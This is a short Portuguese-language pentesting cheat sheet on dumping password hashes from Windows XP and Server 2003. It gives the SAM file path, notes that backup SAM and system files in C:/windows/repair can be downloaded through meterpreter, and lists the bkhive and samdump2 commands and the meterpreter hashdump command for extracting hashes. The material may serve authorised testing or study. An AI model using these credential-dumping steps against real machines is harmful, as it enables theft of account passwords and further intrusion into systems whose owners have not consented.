# Senha no Windows

## Windows XP e Windows Server 2003

Arquivo contendo os hashs de usuários:
C:/windows/system32/config/SAM
*Esse arquivo é criptografado, porém a chave fica dentro do arquivo system na mesma pasta.*
*Também não é possível efetuar o download desses arquivos via meterpreter.*

Contudo no diretório **C:/windows/repair** há um backup dos arquivos **SAM** e **system**, sendo possível efetuar o download via meterpreter.

Para descriptografar o arquivo SAM:
bkhive system bootkey.txt ==> Será gerado o bootkey
samdump2 sam bootkey.txt ==> Será gerado os hashs de senhas

Também é possível pegar os hashs através do comando do meterpreter:
materpreter > hashdump
